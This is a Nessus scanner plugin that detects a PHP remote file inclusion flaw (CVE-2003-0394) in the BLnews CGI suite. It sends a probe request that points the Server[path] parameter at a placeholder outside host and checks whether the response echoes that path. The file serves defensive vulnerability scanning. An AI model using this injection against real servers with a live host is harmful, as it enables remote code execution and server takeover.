#
# This script is (C) Tenable Network Security
#
#
# Ref:
#
# Date: Thu, 22 May 2003 14:42:13 +0400
# From: Over_G <overg@mail.ru>
# To: bugtraq@securityfocus.com
# Subject: PHP source code injection in BLNews


if(description)
{
 script_id(11647);
 script_bugtraq_id(7677);
 script_cve_id("CVE-2003-0394");
 script_version ("$Revision: 1.10 $");

 name["english"] = "BLnews code injection";

 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to make the remote host include php files hosted
on a third party server using the BLnews CGI suite which is installed.

An attacker may use this flaw to inject arbitrary code in the remote
host and gain a shell with the privileges of the web server.

Solution : Upgrade to the latest version
Risk factor : High";




 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of objects.inc.php4";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security",
		francais:"Ce script est Copyright (C) 2003 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);



function check(loc)
{
 req = http_get(item:string(loc, "/admin/objects.inc.php4?Server[path]=http://xxxxxx&Server[language_file]=nessus.php"),
 		port:port);			
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if(egrep(pattern:".*http://xxxxxx/admin/nessus\.php", string:r))
 {
 	security_hole(port);
	exit(0);
 }
}



dirs = make_list(cgi_dirs());


foreach dir (dirs)
{
 check(loc:dir);
}
